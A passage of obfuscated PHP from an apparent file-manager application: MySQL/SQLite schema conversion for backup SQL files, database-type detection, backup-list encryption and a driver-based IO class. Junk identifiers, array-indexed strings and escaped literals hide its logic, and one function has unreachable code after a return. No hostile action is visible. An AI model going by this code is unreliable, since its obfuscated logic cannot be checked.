$°‰Ÿ¹üº[68] . implode($°‰Ÿ¹üº[1250], $íùò¬±’) . $°‰Ÿ¹üº[68]; } private function sqlDecode($ÂßíÉ¯Ì, $’‰Œœóó, $Á£âœ±Ï = '') { $è¼‰¦¾ =& $_SERVER[øşô´çË]; $ÂßíÉ¯Ì = str_replace(array($è¼‰¦¾[1247], $è¼‰¦¾[1248], $è¼‰¦¾[1249]), array($è¼‰¦¾[1246], $è¼‰¦¾[19], $è¼‰¦¾[426]), $ÂßíÉ¯Ì); if ($’‰Œœóó == $è¼‰¦¾[23]) { $ÂßíÉ¯Ì = str_ireplace($è¼‰¦¾[1251], $è¼‰¦¾[69], $ÂßíÉ¯Ì); $ÂßíÉ¯Ì = stripslashes($ÂßíÉ¯Ì); } return preg_replace($è¼‰¦¾[1252], $è¼‰¦¾[12], $ÂßíÉ¯Ì); if ($’‰Œœóó == $è¼‰¦¾[23]) { return $Á£âœ±Ï != $è¼‰¦¾[481] ? stripslashes($ÂßíÉ¯Ì) : $ÂßíÉ¯Ì; } if ($Á£âœ±Ï == $è¼‰¦¾[481]) { $ÂßíÉ¯Ì = str_replace($è¼‰¦¾[1253], $è¼‰¦¾[128], stripslashes($ÂßíÉ¯Ì)); } return $ÂßíÉ¯Ì; } public function getSqlFile($ò›´Šº = '') { $‡èÛş«À =& $_SERVER[øşô´çË]; $“µ…†Á‚ = $this->dbType(!0); $¡ó¬ïÉô = CONTROLLER_DIR . "\x69\x6e\163\x74\141\x6c\x6c\x2f\x64\141\x74\141\57{$“µ…†Á‚}\x2e\x73\161\x6c"; if (!file_exists($¡ó¬ïÉô)) { return !1; } $¼Èíå§… = file_get_contents($¡ó¬ïÉô); $ˆì•º¨Ë = $‡èÛş«À[1254] . ($“µ…†Á‚ == $‡èÛş«À[903] ? $‡èÛş«À[1255] : $‡èÛş«À[1256]) . $‡èÛş«À[1257]; preg_match_all($ˆì•º¨Ë, $¼Èíå§…, $Ôâïşª·); $’€Éı„ = $Ôâïşª·[1]; $ °ÊÃ¬ø = $this->model()->db(); $Ñ‚¾Ç„ø = $ °ÊÃ¬ø->getTables(); $«Ü”ÑÁİ = TEMP_FILES . $‡èÛş«À[1258] . date($‡èÛş«À[269]) . $‡èÛş«À[8]; del_dir($«Ü”ÑÁİ); mk_dir($«Ü”ÑÁİ); $ÆÎîŒõ± = $«Ü”ÑÁİ . $‡èÛş«À[1259]; $úšá×°İ = $«Ü”ÑÁİ . $‡èÛş«À[1260]; $Îò¥ìã = $“µ…†Á‚ == $‡èÛş«À[23] ? $‡èÛş«À[903] : $‡èÛş«À[23]; IO::copy(CONTROLLER_DIR . "\x69\156\163\164\x61\x6c\154\57\x64\141\164\x61\57{$Îò¥ìã}\56\163\161\x6c", $«Ü”ÑÁİ); @touch($«Ü”ÑÁİ . $“µ…†Á‚ . $‡èÛş«À[893]); $áËİ–íß = fopen($ÆÎîŒõ±, $‡èÛş«À[1232]); $¢£’¨—™ = fopen($úšá×°İ, $‡èÛş«À[1232]); if ($“µ…†Á‚ == $‡èÛş«À[23]) { $Ñ‚¾Ç„ø = array_diff($Ñ‚¾Ç„ø, array($‡èÛş«À[886], $‡èÛş«À[887])); $œ›„¨–Ö = array($‡èÛş«À[1261], $‡èÛş«À[1262], $‡èÛş«À[1263]); fwrite($¢£’¨—™, implode(PHP_EOL, $œ›„¨–Ö) . PHP_EOL . PHP_EOL); foreach ($Ñ‚¾Ç„ø as $²—±óˆ) { $å‚ôÉõˆ = $this->sqlFromSqlite($²—±óˆ); if (!$å‚ôÉõˆ[$‡èÛş«À[23]]) { continue; } fwrite($¢£’¨—™, $å‚ôÉõˆ[$‡èÛş«À[23]] . PHP_EOL . PHP_EOL); if (!in_array($²—±óˆ, $’€Éı„)) { fwrite($áËİ–íß, $å‚ôÉõˆ[$‡èÛş«À[903]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Ñ‚¾Ç„ø as $²—±óˆ) { $å‚ôÉõˆ = $this->sqlFromMysql($²—±óˆ); if (!$å‚ôÉõˆ[$‡èÛş«À[903]]) { continue; } fwrite($áËİ–íß, $å‚ôÉõˆ[$‡èÛş«À[903]] . PHP_EOL . PHP_EOL); if (!in_array($²—±óˆ, $’€Éı„)) { fwrite($¢£’¨—™, $å‚ôÉõˆ[$‡èÛş«À[23]] . PHP_EOL . PHP_EOL); } } } fclose($áËİ–íß); fclose($¢£’¨—™); $¼Èíå§… = array($‡èÛş«À[903] => $ÆÎîŒõ±, $‡èÛş«À[23] => $úšá×°İ); return $ò›´Šº ? $¼Èíå§…[$ò›´Šº] : $¼Èíå§…; } public function dbType($¤Õ²¦¼¬ = false) { $õº‹àâá =& $_SERVER[øşô´çË]; $ğÙ›¼¯Ö = $¤Õ²¦¼¬ ? $GLOBALS[$õº‹àâá[6]][$õº‹àâá[31]] : $this->database; $ğÙ›¼¯Ö = array_change_key_case($ğÙ›¼¯Ö); $õ¢ƒøñã = $ğÙ›¼¯Ö[$õº‹àâá[1131]]; if ($õ¢ƒøñã == $õº‹àâá[1128]) { $ÓÅ¥Õà = explode($õº‹àâá[4], $ğÙ›¼¯Ö[$õº‹àâá[1137]]); $õ¢ƒøñã = $ÓÅ¥Õà[0]; } $˜‡±âä = array($õº‹àâá[1264] => $õº‹àâá[23], $õº‹àâá[1073] => $õº‹àâá[903]); if (isset($˜‡±âä[$õ¢ƒøñã])) { $õ¢ƒøñã = $˜‡±âä[$õ¢ƒøñã]; } return $õ¢ƒøñã; } public function sqlFromMysql($Çòû®öİ, $¹ùì¸©ê = '') { $‰ñ¹×™Ê =& $_SERVER[øşô´çË]; $Òœæîú× = array($‰ñ¹×™Ê[903] => $‰ñ¹×™Ê[12], $‰ñ¹×™Ê[23] => $‰ñ¹×™Ê[12]); $í”™¨ ø = $this->escapeName($Çòû®öİ); $ì¬×·ı” = $this->escapeName($Çòû®öİ, $‰ñ¹×™Ê[23]); $ÒœÔè®“ = $this->model()->db(); $ÂçİÔ¸ = $ÒœÔè®“->query("\163\x68\157\167\40\x63\x72\145\141\164\x65\40\164\x61\x62\x6c\x65\x20{$í”™¨ ø}\73"); if (!$ÂçİÔ¸ || !$ÂçİÔ¸[0]) { return !1; } $­‡¼§ÙÈ = _get($ÂçİÔ¸[0], $‰ñ¹×™Ê[1265], $‰ñ¹×™Ê[12]); if (!$­‡¼§ÙÈ) { return !1; } $†²ûñ¥Ç = "\x44\x52\117\x50\40\124\x41\x42\x4c\x45\x20\x49\x46\x20\x45\130\x49\123\x54\123\40{$í”™¨ ø}\x3b" . PHP_EOL . $­‡¼§ÙÈ . $‰ñ¹×™Ê[84]; if ($¹ùì¸©ê == $‰ñ¹×™Ê[903]) { return $†²ûñ¥Ç; } $Òœæîú×[$‰ñ¹×™Ê[903]] = $†²ûñ¥Ç; $£ÒëÔéå = array_change_key_case($GLOBALS[$‰ñ¹×™Ê[6]][$‰ñ¹×™Ê[31]]); $½ü§©¦« = $£ÒëÔéå[$‰ñ¹×™Ê[1136]]; $ÍæÍ†ĞÉ = $‰ñ¹×™Ê[1266] . $½ü§©¦« . "\47\40\101\116\x44\x20\124\x41\102\114\x45\x5f\x4e\x41\x4d\x45\40\75\x20{$ì¬×·ı”}\73"; $ï¸±ğÇ© = "\123\x48\x4f\x57\40\111\x4e\104\105\130\40\106\x52\117\115\40{$í”™¨ ø}\x3b"; $ÅöêÛ‹’ = $ÒœÔè®“->query($ÍæÍ†ĞÉ); if (empty($ÅöêÛ‹’)) { return $¹ùì¸©ê ? $Òœæîú×[$¹ùì¸©ê] : $Òœæîú×; } $Õ¹ íÌÇ = $ÒœÔè®“->query($ï¸±ğÇ©); $êÏàÒ¨„ = $‰ñ¹×™Ê[12]; $İ„„àÓ = array(); foreach ($Õ¹ íÌÇ as $«Òêó…•) { if (!$êÏàÒ¨„ && $«Òêó…•[$‰ñ¹×™Ê[1267]] == $‰ñ¹×™Ê[1268]) { $êÏàÒ¨„ = $«Òêó…•[$‰ñ¹×™Ê[1269]]; } if (isset($İ„„àÓ[$«Òêó…•[$‰ñ¹×™Ê[1267]]])) { $İ„„àÓ[$«Òêó…•[$‰ñ¹×™Ê[1267]]][$‰ñ¹×™Ê[1270]][] = $«Òêó…•[$‰ñ¹×™Ê[1269]]; continue; } $İ„„àÓ[$«Òêó…•[$‰ñ¹×™Ê[1267]]] = array($‰ñ¹×™Ê[1271] => $«Òêó…•[$‰ñ¹×™Ê[1267]], $‰ñ¹×™Ê[1270] => array($«Òêó…•[$‰ñ¹×™Ê[1269]]), $‰ñ¹×™Ê[1272] => $«Òêó…•[$‰ñ¹×™Ê[1273]] == $‰ñ¹×™Ê[101] ? 0 : 1); } $¡îéİ = array(); foreach ($İ„„àÓ as $«Òêó…•) { $œÃÄèŞê = $«Òêó…•[$‰ñ¹×™Ê[1271]] == $‰ñ¹×™Ê[1268]; $“ºí¿ƒı = $«Òêó…•[$‰ñ¹×™Ê[1272]] == $‰ñ¹×™Ê[101] && !$œÃÄèŞê ? $‰ñ¹×™Ê[1274] : $‰ñ¹×™Ê[12]; $°ˆÆ§ÎŠ = $‰ñ¹×™Ê[1275] . $Çòû®öİ . $‰ñ¹×™Ê[11] . ($œÃÄèŞê ? $‰ñ¹×™Ê[1276] : $«Òêó…•[$‰ñ¹×™Ê[1271]]); $×´æÄï™ = $‰ñ¹×™Ê[1277] . implode($‰ñ¹×™Ê[1278], $«Òêó…•[$‰ñ¹×™Ê[1270]]) . $‰ñ¹×™Ê[1279]; $¡îéİ[] = sprintf($‰ñ¹×™Ê[1280], $‰ñ¹×™Ê[1281], $“ºí¿ƒı, $‰ñ¹×™Ê[1282], $°ˆÆ§ÎŠ, $‰ñ¹×™Ê[1283], $Çòû®öİ, $×´æÄï™); } $‘¸óŞ’ù = array(); $»ÓÆı¥á = array($‰ñ¹×™Ê[1284] => $‰ñ¹×™Ê[399], $‰ñ¹×™Ê[1285] => $‰ñ¹×™Ê[399], $‰ñ¹×™Ê[373] => $‰ñ¹×™Ê[399], $‰ñ¹×™Ê[372] => $‰ñ¹×™Ê[399], $‰ñ¹×™Ê[1286] => $‰ñ¹×™Ê[1287], $‰ñ¹×™Ê[1288] => $‰ñ¹×™Ê[1287], $‰ñ¹×™Ê[1287] => $‰ñ¹×™Ê[1287], $‰ñ¹×™Ê[1289] => $‰ñ¹×™Ê[1287], $‰ñ¹×™Ê[292] => $‰ñ¹×™Ê[1287], $‰ñ¹×™Ê[1290] => $‰ñ¹×™Ê[1287], $‰ñ¹×™Ê[1291] => $‰ñ¹×™Ê[1287], $‰ñ¹×™Ê[1292] => $‰ñ¹×™Ê[1293], $‰ñ¹×™Ê[374] => $‰ñ¹×™Ê[1293], $‰ñ¹×™Ê[375] => $‰ñ¹×™Ê[1293], $‰ñ¹×™Ê[1294] => $‰ñ¹×™Ê[1294]); foreach ($ÅöêÛ‹’ as $«Òêó…•) { $¹ùì¸©ê = _get($»ÓÆı¥á, $«Òêó…•[$‰ñ¹×™Ê[1295]], $«Òêó…•[$‰ñ¹×™Ê[1296]]); $ÄîÄîÕË = $«Òêó…•[$‰ñ¹×™Ê[1297]] == $‰ñ¹×™Ê[1056] ? $‰ñ¹×™Ê[1298] : $‰ñ¹×™Ê[1299]; $ÁÅÒîØÌ = $«Òêó…•[$‰ñ¹×™Ê[1300]] == $êÏàÒ¨„ ? $‰ñ¹×™Ê[1301] : $‰ñ¹×™Ê[12]; $êè‰¸ø = $«Òêó…•[$‰ñ¹×™Ê[1110]] ? strtoupper(str_replace($‰ñ¹×™Ê[11], $‰ñ¹×™Ê[12], $«Òêó…•[$‰ñ¹×™Ê[1110]])) : $‰ñ¹×™Ê[12]; $‘¸óŞ’ù[] = sprintf($‰ñ¹×™Ê[1302], $«Òêó…•[$‰ñ¹×™Ê[1300]], $¹ùì¸©ê, $ÄîÄîÕË, $ÁÅÒîØÌ, $êè‰¸ø); } $¸ŒÒæÀ“ = array("\104\x52\x4f\120\40\124\x41\102\114\105\x20\x49\106\40\105\130\111\123\x54\123\x20{$ì¬×·ı”}\x3b", "\103\x52\x45\101\x54\105\40\124\x41\102\x4c\105\x20{$ì¬×·ı”}\x20\x28", implode($‰ñ¹×™Ê[60] . PHP_EOL, $‘¸óŞ’ù), $‰ñ¹×™Ê[1303]); $ıÒ¯–ÅŸ = implode(PHP_EOL, array_merge($¸ŒÒæÀ“, $¡îéİ)); if ($¹ùì¸©ê == $‰ñ¹×™Ê[23]) { return $ıÒ¯–ÅŸ; } $Òœæîú×[$‰ñ¹×™Ê[23]] = $ıÒ¯–ÅŸ; return $Òœæîú×; } public function sqlFromSqlite($õú‘ÓøÃ, $Ÿû†İÃ‰ = '') { $ª±öÏ® =& $_SERVER[øşô´çË]; $½±›İ÷Ê = array($ª±öÏ®[903] => $ª±öÏ®[12], $ª±öÏ®[23] => $ª±öÏ®[12]); $Ü‹ÕÏ„Ô = $this->escapeName($õú‘ÓøÃ); $´ûÆÓ‘ø = $this->escapeName($õú‘ÓøÃ, $ª±öÏ®[23]); $ıíÓÑÇ = $this->model()->db(); $»§ñÙš = "\120\122\101\x47\115\x41\x20\x54\101\102\114\x45\x5f\111\116\x46\x4f\x20\x28\47{$õú‘ÓøÃ}\x27\x29"; $ÓÃË¦æ = "\123\x45\114\x45\103\x54\x20\52\x20\106\122\117\115\40\x73\x71\154\151\164\145\x5f\155\x61\163\x74\x65\x72\40\x57\110\105\x52\x45\x20\x74\x62\x6c\137\156\x61\x6d\x65\40\x3d\40\x27{$õú‘ÓøÃ}\47"; $çğñ»ì· = $ıíÓÑÇ->query($»§ñÙš); if (empty($çğñ»ì·)) { return $Ÿû†İÃ‰ ? $½±›İ÷Ê[$Ÿû†İÃ‰] : $½±›İ÷Ê; } $Ä¼ŞìÖ = $ıíÓÑÇ->query($ÓÃË¦æ); $ô©Ç¸¹Ù = $¢¦…úè = array(); foreach ($Ä¼ŞìÖ as $Á¯Œ¬¯Ú) { if ($Á¯Œ¬¯Ú[$ª±öÏ®[43]] == $ª±öÏ®[366]) { $ô©Ç¸¹Ù[] = $Á¯Œ¬¯Ú[$ª±öÏ®[1304]]; } else { $¢¦…úè[] = $Á¯Œ¬¯Ú[$ª±öÏ®[1304]]; } } $ˆªèà’Ê = array_merge(array("\x44\122\x4f\x50\40\124\101\x42\114\105\40\x49\x46\40\105\x58\111\x53\x54\x53\40{$´ûÆÓ‘ø}\73"), $ô©Ç¸¹Ù, $¢¦…úè); $ˆªèà’Ê = implode($ª±öÏ®[84] . PHP_EOL, $ˆªèà’Ê) . $ª±öÏ®[84]; if ($Ÿû†İÃ‰ == $ª±öÏ®[23]) { return $ˆªèà’Ê; } $½±›İ÷Ê[$ª±öÏ®[23]] = $ˆªèà’Ê; $İĞå’æ = $®‚Ÿšë® = array(); $áùõÜ®Ü = array(); $Ğˆ¾¢ê = array(); foreach ($Ä¼ŞìÖ as $Á¯Œ¬¯Ú) { if ($Á¯Œ¬¯Ú[$ª±öÏ®[43]] == $ª±öÏ®[1305]) { $ø«™ÜãÖ = $Á¯Œ¬¯Ú[$ª±öÏ®[1304]]; $Ú½»¬äü = stripos($ø«™ÜãÖ, $ª±öÏ®[1274]) !== !1; $¸ÒÍÁìË = stripos($ø«™ÜãÖ, $ª±öÏ®[1268]) !== !1; preg_match($ª±öÏ®[1306], $ø«™ÜãÖ, $Òœ†Éõ); if (empty($Òœ†Éõ)) { continue; } $¢½•şâó = array_map($ª±öÏ®[1307], explode($ª±öÏ®[60], $Òœ†Éõ[1])); $ñ³–˜‡ = array(); foreach ($¢½•şâó as $İ¯èÈÅÚ) { $¦æõö“á = trim($İ¯èÈÅÚ, $ª±öÏ®[1308]); $ñ³–˜‡[] = $¦æõö“á; $áùõÜ®Ü[$¦æõö“á] = !0; } $Ğˆ¾¢ê[] = array($ª±öÏ®[42] => $Á¯Œ¬¯Ú[$ª±öÏ®[42]], $ª±öÏ®[1304] => $ø«™ÜãÖ, $ª±öÏ®[1309] => $Ú½»¬äü, $ª±öÏ®[1310] => $¸ÒÍÁìË, $ª±öÏ®[1311] => $ñ³–˜‡); } } $¦ÚœçÄå = array($ª±öÏ®[1285] => $ª±öÏ®[1285], $ª±öÏ®[399] => $ª±öÏ®[1312], $ª±öÏ®[1293] => $ª±öÏ®[1313], $ª±öÏ®[1287] => $ª±öÏ®[1287], $ª±öÏ®[1294] => $ª±öÏ®[1314], $ª±öÏ®[1315] => $ª±öÏ®[1316]); $Ó¤åí•™ = array($ª±öÏ®[460], $ª±öÏ®[178], $ª±öÏ®[549]); $°´Å¼¨ö = array($ª±öÏ®[399], $ª±öÏ®[1293], $ª±öÏ®[1315], $ª±öÏ®[1285]); foreach ($çğñ»ì· as $Á¯Œ¬¯Ú) { $“ê‰Ÿõ = $Á¯Œ¬¯Ú[$ª±öÏ®[42]]; $„™è­ôş = strtolower($Á¯Œ¬¯Ú[$ª±öÏ®[43]]); if ($„™è­ôş == $ª±öÏ®[1287] && isset($áùõÜ®Ü[$“ê‰Ÿõ])) { $Ÿû†İÃ‰ = in_array($“ê‰Ÿõ, $Ó¤åí•™) ? $ª±öÏ®[1287] : $ª±öÏ®[1317]; } else { $Ÿû†İÃ‰ = _get($¦ÚœçÄå, $„™è­ôş, $„™è­ôş); } if ($Á¯Œ¬¯Ú[$ª±öÏ®[67]] > 0) { $®‚Ÿšë®[$Á¯Œ¬¯Ú[$ª±öÏ®[67]]] = $“ê‰Ÿõ; } $…Ú¹™—¿ = $ª±öÏ®[12]; if ($Á¯Œ¬¯Ú[$ª±öÏ®[66]] !== null) { $²™îÔĞù = $Á¯Œ¬¯Ú[$ª±öÏ®[66]]; if (in_array($„™è­ôş, $°´Å¼¨ö) && is_numeric($²™îÔĞù)) { $…Ú¹™—¿ = "\104\105\106\101\125\x4c\124\40{$²™îÔĞù}"; } else { if (strtolower($²™îÔĞù) === $ª±öÏ®[113]) { $…Ú¹™—¿ = $Á¯Œ¬¯Ú[$ª±öÏ®[45]] ? $ª±öÏ®[12] : $ª±öÏ®[1299]; } else { $Ê˜›°Ù€ = is_numeric($²™îÔĞù) ? $²™îÔĞù : $ª±öÏ®[68] . addslashes($²™îÔĞù) . $ª±öÏ®[68]; $…Ú¹™—¿ = "\x44\x45\106\101\x55\114\124\40{$Ê˜›°Ù€}"; } } } $¸Œ„³»Ã = $Á¯Œ¬¯Ú[$ª±öÏ®[45]] ? $ª±öÏ®[1298] : $ª±öÏ®[1318]; $­Ö¨«òÉ = stripos($„™è­ôş, $ª±öÏ®[373]) !== !1 && $Á¯Œ¬¯Ú[$ª±öÏ®[67]] ? $ª±öÏ®[1319] : $ª±öÏ®[12]; $İĞå’æ[] = sprintf($ª±öÏ®[1320], $“ê‰Ÿõ, $Ÿû†İÃ‰, $¸Œ„³»Ã, $…Ú¹™—¿, $­Ö¨«òÉ); } if (!empty($®‚Ÿšë®)) { ksort($®‚Ÿšë®); $…‚ãäš  = $ª±öÏ®[484] . implode($ª±öÏ®[1240], $®‚Ÿšë®) . $ª±öÏ®[484]; $İĞå’æ[] = "\x50\x52\111\115\101\122\x59\x20\x4b\105\x59\x20\x28{$…‚ãäš }\51"; } foreach ($Ğˆ¾¢ê as $•ÌÚŒ·) { if ($•ÌÚŒ·[$ª±öÏ®[1310]]) { continue; } $ùÈ—ƒ§ı = array(); foreach ($•ÌÚŒ·[$ª±öÏ®[1311]] as $İ¯èÈÅÚ) { $¦ÚœçÄå = null; foreach ($çğñ»ì· as $Ä¶š«Ø¬) { if ($Ä¶š«Ø¬[$ª±öÏ®[42]] == $İ¯èÈÅÚ) { $¦ÚœçÄå = strtolower($Ä¶š«Ø¬[$ª±öÏ®[43]]); break; } } if ($¦ÚœçÄå == $ª±öÏ®[1287] && in_array($İ¯èÈÅÚ, $Ó¤åí•™)) { $ùÈ—ƒ§ı[] = "\x60{$İ¯èÈÅÚ}\140\x28\62\65\60\51"; } else { $ùÈ—ƒ§ı[] = "\x60{$İ¯èÈÅÚ}\140"; } } $„™è­ôş = ($•ÌÚŒ·[$ª±öÏ®[1309]] ? $ª±öÏ®[1321] : $ª±öÏ®[12]) . $ª±öÏ®[1322]; $éÛìº = str_replace($ª±öÏ®[1275] . $õú‘ÓøÃ . $ª±öÏ®[11], $ª±öÏ®[12], $•ÌÚŒ·[$ª±öÏ®[42]]); $éÛìº = str_replace($õú‘ÓøÃ . $ª±öÏ®[11], $ª±öÏ®[12], $éÛìº); $İĞå’æ[] = "{$„™è­ôş}\x20\x60{$éÛìº}\140\x20\x28" . implode($ª±öÏ®[60], $ùÈ—ƒ§ı) . $ª±öÏ®[1239]; } $¾·º¥¼ = array("\x44\x52\117\120\x20\x54\x41\x42\x4c\x45\40\111\106\x20\105\130\x49\123\124\x53\x20{$Ü‹ÕÏ„Ô}\x3b", "\103\122\105\101\124\x45\x20\124\101\x42\x4c\105\x20{$Ü‹ÕÏ„Ô}\40\50", implode($ª±öÏ®[60] . PHP_EOL, $İĞå’æ), $ª±öÏ®[1323]); $¾·º¥¼ = implode(PHP_EOL, $¾·º¥¼); if ($Ÿû†İÃ‰ == $ª±öÏ®[903]) { return $¾·º¥¼; } $½±›İ÷Ê[$ª±öÏ®[903]] = $¾·º¥¼; return $½±›İ÷Ê; } private function escapeName($æ¸şŒîá, $Ğô­Éï± = "\155\x79\163\161\154") { $ïÎÜ…š« =& $_SERVER[øşô´çË]; $æ¸şŒîá = preg_replace($ïÎÜ…š«[1324], $ïÎÜ…š«[12], $æ¸şŒîá); if ($Ğô­Éï± === $ïÎÜ…š«[903]) { return "\x60{$æ¸şŒîá}\x60"; } return "\x22{$æ¸şŒîá}\x22"; } public function mixBakList($óô°ÆÀ£) { $ĞÊàš =& $_SERVER[øşô´çË]; $óô°ÆÀ£ = rtrim($óô°ÆÀ£, $ĞÊàš[8]) . $ĞÊàš[8]; $‰·Å’İ = $ĞÊàš[1325]; $£×‰–Ç = IO::listPath($óô°ÆÀ£); if (empty($£×‰–Ç[$ĞÊàš[96]])) { return !1; } $œˆ¿­şô = array(); foreach ($£×‰–Ç[$ĞÊàš[96]] as $›ÓÃëéÀ => $ë®ä°…¿) { if (!$ë®ä°…¿[$ĞÊàš[42]] || !$ë®ä°…¿[$ĞÊàš[97]]) { continue; } $æô™ »÷ = Mcrypt::encode($ë®ä°…¿[$ĞÊàš[42]], $‰·Å’İ); $Ãñî™ƒ = md5($æô™ »÷); IO::rename($ë®ä°…¿[$ĞÊàš[97]], $Ãñî™ƒ); $œˆ¿­şô[$Ãñî™ƒ] = $æô™ »÷; } $÷ş¤Ü±Ï = md5($ĞÊàš[1326] . $‰·Å’İ); IO::setContent($óô°ÆÀ£ . $÷ş¤Ü±Ï, json_encode($œˆ¿­şô)); return !0; } public function unmixBakList($óŞøúì) { $–¼ê¤Œ‡ =& $_SERVER[øşô´çË]; $óŞøúì = rtrim($óŞøúì, $–¼ê¤Œ‡[8]) . $–¼ê¤Œ‡[8]; $À¼ÒÓ¯ = $this->unmixBakListGet($óŞøúì, !0); if (empty($À¼ÒÓ¯)) { return !1; } foreach ($À¼ÒÓ¯ as $ªÇß¥ñ => $ç¾³ìî) { $úéèæüş = IO::rename($óŞøúì . $ç¾³ìî, $ªÇß¥ñ); if (!$úéèæüş) { return !1; } } return !0; } public function unmixBakListGet($‡˜¼ÒÜÃ, $ƒšÕÊì = false) { $Š–Á­ˆ =& $_SERVER[øşô´çË]; $‡˜¼ÒÜÃ = rtrim($‡˜¼ÒÜÃ, $Š–Á­ˆ[8]) . $Š–Á­ˆ[8]; $­ò¿Æ² = $Š–Á­ˆ[1325]; $¯Ïøù¯¬ = md5($Š–Á­ˆ[1326] . $­ò¿Æ²); $æç£äĞ¡ = $‡˜¼ÒÜÃ . $¯Ïøù¯¬; if (!IO::exist($æç£äĞ¡)) { return !1; } $Á±èƒ…Ğ = json_decode(IO::getContent($æç£äĞ¡), !0); if (empty($Á±èƒ…Ğ)) { return !1; } $úÓåóì = array(); foreach ($Á±èƒ…Ğ as $äËíëğğ => $à¥Á½†) { $¯Ïøù¯¬ = Mcrypt::decode($à¥Á½†, $­ò¿Æ²); $úÓåóì[$¯Ïøù¯¬] = $äËíëğğ; } if ($ƒšÕÊì) { IO::remove($æç£äĞ¡, !1); } return $úÓåóì; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($®»åèùò, $Ñã×±) { $ ª™Û¯Š =& $_SERVER[øşô´çË]; $ÒÂ¹ÄŞç = $Ñã×±; $GLOBALS[$ ª™Û¯Š[1327]] = $ ª™Û¯Š[1328] . $®»åèùò; Hook::trigger($ ª™Û¯Š[1328] . $®»åèùò . $ ª™Û¯Š[1329], $ÒÂ¹ÄŞç); $•œÈŠ®® = self::driverMake($Ñã×±[0]); if (!$•œÈŠ®®) { return !1; } if ($®»åèùò == $ ª™Û¯Š[650] || $®»åèùò == $ ª™Û¯Š[652] || $®»åèùò == $ ª™Û¯Š[1330]) { if (!trim($•œÈŠ®®->path . $ ª™Û¯Š[472], $ ª™Û¯Š[8])) { return !1; } } if (method_exists($•œÈŠ®®, $®»åèùò)) { $ùÁÀÎ‹ = @call_user_func_array(array($•œÈŠ®®, $®»åèùò), $Ñã×±); } else { if (method_exists($•œÈŠ®®, $ ª™Û¯Š[1331])) { $ùÁÀÎ‹ = @call_user_func_array(array($•œÈŠ®®, $®»åèùò), $Ñã×±); } else { if (method_exists(self, $®»åèùò)) { $ùÁÀÎ‹ = @call_user_func_array(array(self, $®»åèùò), $Ñã×±); } else { $ùÁÀÎ‹ = call_user_func_array(array(parent, $®»åèùò), $Ñã×±); } } } Hook::trigger($ ª™Û¯Š[1328] . $®»åèùò . $ ª™Û¯Š[1332], $ÒÂ¹ÄŞç, $ùÁÀÎ‹); return $ùÁÀÎ‹; } public static function init($ŠöÛ¢Òµ) { return self::driverMake($ŠöÛ¢Òµ); } public static function copy($Ôéşú¨, $ÌÓÜÂÃÄ, $ÌƒŞçÎ­ = false, $íú®÷Æî = false) { return self::copyMoveStart($Ôéşú¨, $ÌÓÜÂÃÄ, $ÌƒŞçÎ­, $_SERVER[øşô´çË][650], $íú®÷Æî); } public static function move($öè¯×ÚŒ, $¨ŸÃ‚´, $´ğ½ÆÖƒ = false, $›¤’Š³ü = false) { return self::copyMoveStart($öè¯×ÚŒ, $¨ŸÃ‚´, $´ğ½ÆÖƒ, $_SERVER[øşô´çË][652], $›¤’Š³ü); } public static function copyMoveChildren($‹È­³ñÇ, $åòö´õù, $ØÖ˜£Ï– = "\x63\x6f\x70\171", $™¹–±í = REPEAT_REPLACE) { $óê¿ê³” =& $_SERVER[øşô´çË]; $Æñ‰ÓÑ´ = $‹È­³ñÇ; $Áğı–õ™ = self::driverMake($‹È­³ñÇ); $»°­§Ğ¯ = $Áğı–õ™->listPath($‹È­³ñÇ, !0); $Ã™Ì‘ = array_merge($»°­§Ğ¯[$óê¿ê³”[96]], $»°­§Ğ¯[$óê¿ê³”[95]]); foreach ($Ã™Ì‘ as $š³û½üí) { self::copyMoveStart($š³û½üí[$óê¿ê³”[97]], $åòö´õù, $™¹–±í, $ØÖ˜£Ï–, !1); } if ($ØÖ˜£Ï– == $óê¿ê³”[652]) { self::remove($Æñ‰ÓÑ´); } } private static function copyMoveStart($‡Ê”ĞÕî, $Ÿ›“åŸì, $Ş¥¦ÍÈĞ, $şÂ©ÆÀ·, $ ¿êİıñ) { $İåñäÇİ =& $_SERVER[øşô´çË]; $ğÈÃÀ«ƒ = array($‡Ê”ĞÕî, $Ÿ›“åŸì, $Ş¥¦ÍÈĞ, $ ¿êİıñ); Hook::trigger($İåñäÇİ[1328] . $şÂ©ÆÀ· . $İåñäÇİ[1329], $ğÈÃÀ«ƒ); $ãŞá÷ì› = self::copyMove($‡Ê”ĞÕî, $Ÿ›“åŸì, $Ş¥¦ÍÈĞ, $şÂ©ÆÀ·, $ ¿êİıñ); Hook::trigger($İåñäÇİ[1328] . $şÂ©ÆÀ· . $İåñäÇİ[1332], $ğÈÃÀ«ƒ, $ãŞá÷ì›); return $ãŞá÷ì›; } public static function saveFile($³ïĞÎì, $µü×“Ñß, $÷Ô»Š¾¾ = true) { $Æ³ÚºÈû =& $_SERVER[øşô´çË]; $Ô”æÍŸ— = self::info($µü×“Ñß); $´¥‚³Õ‡ = self::driverMake($³ïĞÎì); $ë»à¥ = self::driverMake($µü×“Ñß); $ªéîø‡™ = !1; if ($ë»à¥->pathParse[$Æ³ÚºÈû[1333]]) { $ªéîø‡™ = $ë»à¥; $éæÁ–â = $ë»à¥->pathParse[$Æ³ÚºÈû[1333]]; $ë»à¥ = self::driverMake($éæÁ–â); } if ($´¥‚³Õ‡->pathParse[$Æ³ÚºÈû[1333]]) { $—ÆóÉ¼– = $´¥‚³Õ‡->pathParse[$Æ³ÚºÈû[1333]]; $´¥‚³Õ‡ = self::driverMake($—ÆóÉ¼–); } $í‹Ÿ²Ê = $ë»à¥->pathFather($µü×“Ñß); $õÓá°Ñ = !0; if (!$÷Ô»Š¾¾ && self::driverIsSame($´¥‚³Õ‡, $ë»à¥)) { $õÓá°Ñ = !1; } $Ñ™²„‘„ = self::copyFile($´¥‚³Õ‡, $³ïĞÎì, $ë»à¥, $í‹Ÿ²Ê, $Ô”æÍŸ—[$Æ³ÚºÈû[42]], $õÓá°Ñ); if ($ªéîø‡™) { $Ñ™²„‘„ = $ªéîø‡™->getPathOuter($Ñ™²„‘„); } return $Ñ™²„‘„; } private static function copyMove($ê³¿•, $áªË¶õ, $ëÚ—úÀ, $§ÉÁÏÂ, $âÇ¢š˜æ = false) { $ãÑ‚ÌÅé =& $_SERVER[øşô´çË]; if (!$ê³¿• || $ê³¿• == $ãÑ‚ÌÅé[8] || !$áªË¶õ) { return !1; 